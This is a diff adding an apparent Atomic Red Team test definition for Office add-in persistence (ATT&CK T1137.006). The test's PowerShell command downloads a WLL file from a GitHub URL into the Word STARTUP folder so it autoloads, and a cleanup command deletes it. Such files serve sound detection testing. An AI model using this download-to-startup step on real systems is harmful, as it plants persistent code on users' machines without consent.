@@ -1,0 +1,20 @@
+attack_technique: T1137.006
+display_name: 'Office Application Startup: Add-ins'
+atomic_tests:
+- name: Drop of WLL file in Word Startup
+  auto_generated_guid: 4a657d50-1419-43f5-a3d2-0d3d57999a34
+  description: |
+    Executes a WLL file into the Word Startup folder %APPDATA%\Microsoft\Word\STARTUP.
+  supported_platforms:
+  - windows
+  input_arguments:
+    url_to_wll_file:
+      description: URL to wll file
+      type: url
+      default: https://github.com/Inovasys-CS/EDI/raw/main/persistence/wll_file_drop/bin/popup.wll
+  executor:
+    command: |
+      Invoke-WebRequest "#{url_to_wll_file}" -OutFile "C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Word\STARTUP\popup.wll"
+    cleanup_command: |
+      Remove-Item "C:\Users\$Env:UserName\AppData\Roaming\Microsoft\Word\STARTUP\popup.wll"
+    name: powershell
